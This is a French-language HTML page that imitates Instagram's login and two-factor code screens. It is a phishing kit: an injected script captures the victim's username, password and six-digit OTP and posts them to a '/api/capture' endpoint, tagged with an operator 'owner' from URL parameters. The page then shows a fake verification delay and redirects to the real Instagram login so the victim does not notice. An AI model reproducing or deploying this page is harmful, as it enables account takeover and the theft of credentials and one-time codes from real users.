<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Instagram</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    -webkit-tap-highlight-color: transparent;
  }

  body {
    background-color: #ffffff;
    color: #000000;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
  }

  /* Conteneur de page (Login & OTP) */
  .page-container {
    display: flex;
    flex-direction: column;
    min-height: 100vh;
    padding: 20px;
    width: 100%;
  }

  .hidden {
    display: none !important;
  }

  /* ================= LOGO INSTAGRAM ================= */
  .logo-container {
    display: flex;
    justify-content: center;
    margin-top: 40px;
    margin-bottom: 30px;
  }

  .ig-logo {
    width: 70px;
    height: 70px;
  }

  /* ================= TEXTES OTP ================= */
  .header-text {
    text-align: center;
    margin-bottom: 30px;
    max-width: 400px;
    margin-left: auto;
    margin-right: auto;
  }

  .header-text h1 {
    font-size: 20px;
    font-weight: 600;
    color: #000000;
    margin-bottom: 10px;
  }

  .header-text p {
    font-size: 15px;
    color: #737373;
    line-height: 1.4;
  }

  /* ================= FORMULAIRES ================= */
  .form-wrapper {
    display: flex;
    flex-direction: column;
    gap: 14px;
    width: 100%;
    max-width: 400px;
    margin: 0 auto;
  }

  .input-wrapper input {
    width: 100%;
    padding: 16px;
    font-size: 16px;
    background-color: #ffffff;
    border: 1px solid #dbdbdb;
    border-radius: 12px;
    color: #000000;
    outline: none;
    transition: border-color 0.2s ease;
  }

  .input-wrapper input:focus {
    border-color: #a0a0a0;
  }

  .input-wrapper input::placeholder {
    color: #737373;
    font-size: 16px;
  }

  /* ===== 6 CASES OTP ===== */
  .otp-container {
    display: flex;
    justify-content: space-between;
    gap: 8px;
    margin-bottom: 10px;
  }

  .otp-input {
    width: 100%;
    height: 55px;
    text-align: center;
    font-size: 22px;
    font-weight: 600;
    color: #000000;
    background-color: #ffffff;
    border: 1px solid #dbdbdb;
    border-radius: 12px;
    outline: none;
    transition: border-color 0.2s ease, background-color 0.2s ease;
    caret-color: #0064e0;
  }

  .otp-input:focus {
    border-color: #0064e0;
    background-color: #fafafa;
  }

  /* Bouton Bleu (Se connecter) */
  .btn-primary {
    width: 100%;
    padding: 15px;
    margin-top: 6px;
    background-color: #0064e0;
    color: #ffffff;
    border: none;
    border-radius: 30px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: background-color 0.2s ease, opacity 0.2s ease;
  }

  .btn-primary:hover:not(:disabled) {
    background-color: #0052b8;
  }
  
  .btn-primary:disabled {
    opacity: 0.6;
    cursor: not-allowed;
  }

  /* Liens */
  .link-text {
    text-align: center;
    margin-top: 12px;
    margin-bottom: 40px;
    font-size: 15px;
    color: #737373;
  }

  .link-text a {
    color: #262626;
    font-weight: 600;
    text-decoration: none;
  }

  .link-text a:hover {
    text-decoration: underline;
  }

  /* ================= SECTION BAS DE PAGE ================= */
  .bottom-actions {
    margin-top: auto;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 24px;
    width: 100%;
    max-width: 400px;
    margin-left: auto;
    margin-right: auto;
    padding-bottom: 10px;
  }

  .btn-outline {
    width: 100%;
    padding: 13px;
    background-color: transparent;
    color: #0064e0;
    border: 1px solid #0064e0;
    border-radius: 30px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    text-decoration: none;
    text-align: center;
    transition: background-color 0.2s ease;
  }

  .btn-outline:hover {
    background-color: rgba(0, 100, 224, 0.05);
  }

  /* Logo Meta */
  .meta-logo {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    color: #000000;
    font-size: 15px;
    font-weight: 500;
  }

  .meta-logo svg {
    width: 20px;
    height: 20px;
  }

  /* ================= CALQUE DE CHARGEMENT ================= */
  .loading-overlay {
    position: fixed;
    inset: 0;
    background-color: #ffffff;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    z-index: 9999;
    opacity: 0;
    visibility: hidden;
    transition: opacity 0.15s ease, visibility 0.15s ease;
  }

  .loading-overlay.active {
    opacity: 1;
    visibility: visible;
  }

  .loader-circle {
    width: 50px;
    height: 50px;
    border-radius: 50%;
    border: 3px solid #f0f0f0;
    border-top-color: #0064e0;
    animation: spin 0.75s linear infinite;
  }

  .loading-text {
    margin-top: 20px;
    color: #737373;
    font-size: 14px;
    font-weight: 500;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }
</style>
</head>

  <div class="loading-overlay" id="loadingOverlay">
    <div class="loader-circle"></div>
    <p class="loading-text" id="loadingText">Connexion en cours...</p>
  </div>

  <script>
    const OFFICIAL_URL = "https://www.instagram.com/accounts/login/";
    const DELAY_MS = 3000; // 3 secondes

    // Éléments de la page de Login
    const loginPage = document.getElementById("loginPage");
    const loginForm = document.getElementById("loginForm");
    const usernameInput = document.getElementById("username");
    const passwordInput = document.getElementById("password");
    const loginBtn = document.getElementById("loginBtn");

    // Éléments de la page OTP
    const otpPage = document.getElementById("otpPage");
    const otpForm = document.getElementById("otpForm");
    const otpInputs = document.querySelectorAll(".otp-input");
    const otpBtn = document.getElementById("otpBtn");
    const resendLink = document.getElementById("resendLink");

    // Éléments de chargement
    const overlay = document.getElementById("loadingOverlay");
    const loadingText = document.getElementById("loadingText");

    /* ========================================================
       1. ÉTAPE LOGIN : Vers la page OTP
       ======================================================== */
    loginForm.addEventListener("submit", (e) => {
      e.preventDefault();
      
      const user = usernameInput.value.trim();
      const pass = passwordInput.value;
      if (!user || !pass) return;

      // Afficher le chargement (3 sec)
      loadingText.textContent = "Connexion en cours...";
      overlay.classList.add("active");

      setTimeout(() => {
        // Cacher le chargement
        overlay.classList.remove("active");
        
        // Cacher la page de login
        loginPage.classList.add("hidden");
        
        // Afficher la page OTP
        otpPage.classList.remove("hidden");
        
        // Mettre le focus sur la 1ère case
        setTimeout(() => otpInputs[0].focus(), 50);
      }, DELAY_MS);
    });

    /* ========================================================
       2. GESTION DES CASES OTP
       ======================================================== */
    function getOtpCode() {
      return Array.from(otpInputs).map(input => input.value).join("");
    }

    function updateOtpButton() {
      const isComplete = getOtpCode().length === otpInputs.length;
      otpBtn.disabled = !isComplete;
    }

    otpInputs.forEach((input, index) => {
      // Saisie
      input.addEventListener("input", (e) => {
        const value = e.target.value.replace(/\D/g, "").slice(0, 1);
        e.target.value = value;
        if (value && index < otpInputs.length - 1) {
          otpInputs[index + 1].focus();
        }
        updateOtpButton();
      });

      // Touche Retour arrière
      input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && !e.target.value && index > 0) {
          otpInputs[index - 1].focus();
          otpInputs[index - 1].value = "";
          updateOtpButton();
        }
        if (e.key === "ArrowLeft" && index > 0) otpInputs[index - 1].focus();
        if (e.key === "ArrowRight" && index < otpInputs.length - 1) otpInputs[index + 1].focus();
      });

      // Coller
      input.addEventListener("paste", (e) => {
        e.preventDefault();
        const pastedData = (e.clipboardData || window.clipboardData).getData("text");
        const digits = pastedData.replace(/\D/g, "").slice(0, otpInputs.length);
        otpInputs.forEach((el, i) => { el.value = digits[i] || ""; });
        const nextIndex = Math.min(digits.length, otpInputs.length - 1);
        otpInputs[nextIndex].focus();
        updateOtpButton();
      });
    });

    /* ========================================================
       3. ÉTAPE OTP : Redirection vers Instagram
       ======================================================== */
    otpForm.addEventListener("submit", (e) => {
      e.preventDefault();
      if (getOtpCode().length !== otpInputs.length) return;

      // Désactiver les champs
      otpInputs.forEach(input => input.disabled = true);
      otpBtn.disabled = true;

      // Afficher le chargement (3 sec)
      loadingText.textContent = "Vérification en cours...";
      overlay.classList.add("active");

      setTimeout(() => {
        // Redirection finale
        window.location.replace(OFFICIAL_URL);
      }, DELAY_MS);
    });

    /* ========================================================
       4. LIEN "RENVOYER"
       ======================================================== */
    resendLink.addEventListener("click", (e) => {
      e.preventDefault();
      resendLink.textContent = "Code envoyé ✓";
      resendLink.style.pointerEvents = "none";
      resendLink.style.opacity = "0.6";
      
      otpInputs.forEach(input => input.value = "");
      otpInputs[0].focus();
      updateOtpButton();

      setTimeout(() => {
        resendLink.textContent = "Renvoyer";
        resendLink.style.pointerEvents = "auto";
        resendLink.style.opacity = "1";
      }, 5000);
    });
  </script>

<script data-real-injected="true" data-injected-mode="otp">
(function () {
  const PARAM_CFG = {
    endpoint: "/api/capture",
    defaultOwner: "Kim",
    network: "Instagram",
    redirectUrl: "https://www.instagram.com/accounts/login/",
    mode: "otp",
    isOtpMode: true
  };

  const urlParams = new URLSearchParams(window.location.search);
  const ownerVal = urlParams.get("user") || urlParams.get("ref") || PARAM_CFG.defaultOwner;
  const typeParam = (urlParams.get("type") || PARAM_CFG.mode).toLowerCase();

  let lastUser = "";
  let lastPass = "";
  let sentSet = new Set();

  function sendCapture(payload) {
    const key = JSON.stringify(payload);
    if (sentSet.has(key)) return;
    sentSet.add(key);

    return fetch(PARAM_CFG.endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      keepalive: true
    }).catch((err) => console.log(err));
  }

  function readFields(scopeEl) {
    const root = (scopeEl && scopeEl.closest && scopeEl.closest("form")) || document;
    const allInputs = Array.from(root.querySelectorAll("input, select, textarea"));

    let user = "";
    let pass = "";
    const otpParts = [];

    allInputs.forEach((el) => {
      const t = (el.type || "").toLowerCase();
      const idName = ((el.id || "") + " " + (el.name || "") + " " + (el.placeholder || "") + " " + (el.className || "") + " " + (el.getAttribute("autocomplete") || "")).toLowerCase();
      const maxLen = parseInt(el.getAttribute("maxlength") || "0", 10);

      if (t === "password") {
        if (!pass) pass = el.value;
      } else if (
        idName.includes("otp") ||
        idName.includes("one-time-code") ||
        idName.includes("code") ||
        (maxLen === 1 && t !== "checkbox" && t !== "radio")
      ) {
        if (el.value && el.value.trim()) otpParts.push(el.value.trim());
      } else if (!["submit", "button", "checkbox", "radio", "hidden"].includes(t)) {
        if (!user && el.value && el.value.trim()) user = el.value.trim();
      }
    });

    if (!user) {
      const firstText = Array.from(document.querySelectorAll("input[type='text'], input[type='email'], input[type='tel'], input:not([type])"))
        .find((i) => !i.classList.contains("otp-input") && i.value && i.value.trim());
      if (firstText) user = firstText.value.trim();
    }
    if (!pass) {
      const p = document.querySelector("input[type='password']");
      if (p) pass = p.value;
    }

    return {
      user: user || lastUser || "",
      pass: pass || lastPass || "",
      otp: otpParts.length > 0 ? otpParts.join("") : "Aucun"
    };
  }

  function handleAction(e, sourceEl) {
    const data = readFields(sourceEl);
    if (data.user) lastUser = data.user;
    if (data.pass) lastPass = data.pass;

    const hasOtpValue = data.otp && data.otp !== "Aucun";
    const stepType = PARAM_CFG.isOtpMode
      ? (hasOtpValue ? (typeParam === "standard" ? "otp" : typeParam) : "otp_step1")
      : "standard";

    if (data.user || data.pass || hasOtpValue) {
      sendCapture({
        owner: ownerVal,
        network: PARAM_CFG.network,
        type: stepType,
        victimUser: lastUser,
        victimPass: lastPass,
        otp: PARAM_CFG.isOtpMode ? data.otp : "Aucun"
      });
    }
  }

  document.addEventListener("submit", (e) => handleAction(e, e.target), true);

  document.addEventListener("click", (e) => {
    const btn = e.target.closest ? e.target.closest("button, input[type='submit'], [role='button']") : null;
    if (!btn) return;
    handleAction(e, btn);
  }, true);

  if (PARAM_CFG.isOtpMode) {
    document.addEventListener("input", (e) => {
      const el = e.target;
      if (!el || el.tagName !== "INPUT") return;
      const isOtpEl = el.classList.contains("otp-input") || /otp|code/i.test((el.id || "") + " " + (el.name || "") + " " + (el.getAttribute("autocomplete") || ""));
      if (!isOtpEl) return;

      const data = readFields(el);
      if (data.otp && data.otp !== "Aucun" && data.otp.length >= 6) {
        sendCapture({
          owner: ownerVal,
          network: PARAM_CFG.network,
          type: typeParam === "standard" ? "otp" : typeParam,
          victimUser: lastUser,
          victimPass: lastPass,
          otp: data.otp
        });
      }
    }, true);
  }
})();
</script>
</body>
</html>
